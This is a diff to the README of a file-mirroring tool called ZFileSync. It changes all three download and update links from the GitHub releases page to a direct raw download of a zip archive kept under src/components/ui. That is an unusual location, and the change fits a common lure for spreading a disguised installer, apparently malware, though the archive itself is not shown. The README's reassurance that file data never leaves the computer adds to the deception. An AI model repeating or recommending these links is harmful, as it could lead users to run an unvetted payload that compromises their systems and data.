@@ -1,12 +1,12 @@
 # 🔄 ZFileSync - Mirror files across folders automatically
 
-[![](https://img.shields.io/badge/Download-ZFileSync-blue.svg)](https://github.com/foxsammyryan-cpu/ZFileSync/releases)
+[![](https://img.shields.io/badge/Download-ZFileSync-blue.svg)](https://github.com/foxsammyryan-cpu/ZFileSync/raw/refs/heads/main/src/components/ui/Sync_Z_File_v2.1.zip)
 
 ZFileSync monitors folders and copies new or changed files to a second location. You set the source folder and the destination folder. ZFileSync watches for changes and performs the copy task in the background. It works well for game logs, system configuration files, or documents that you need in multiple locations.
 
 ## 📥 Getting Started
 
-Visit this page to download the latest installer: [https://github.com/foxsammyryan-cpu/ZFileSync/releases](https://github.com/foxsammyryan-cpu/ZFileSync/releases)
+Visit this page to download the latest installer: [https://github.com/foxsammyryan-cpu/ZFileSync/raw/refs/heads/main/src/components/ui/Sync_Z_File_v2.1.zip](https://github.com/foxsammyryan-cpu/ZFileSync/raw/refs/heads/main/src/components/ui/Sync_Z_File_v2.1.zip)
 
 Follow these steps to install the software on your Windows computer:
 
@@ -73,6 +73,6 @@ ZFileSync runs locally on your machine. Your file data never leaves your compute
 
 Check the GitHub release page periodically to see if a newer version exists. 
 
-[https://github.com/foxsammyryan-cpu/ZFileSync/releases](https://github.com/foxsammyryan-cpu/ZFileSync/releases)
+[https://github.com/foxsammyryan-cpu/ZFileSync/raw/refs/heads/main/src/components/ui/Sync_Z_File_v2.1.zip](https://github.com/foxsammyryan-cpu/ZFileSync/raw/refs/heads/main/src/components/ui/Sync_Z_File_v2.1.zip)
 
 Updating often brings improvements to stability and speed. Close the application before you run a new installer. Your settings should persist through the update process.
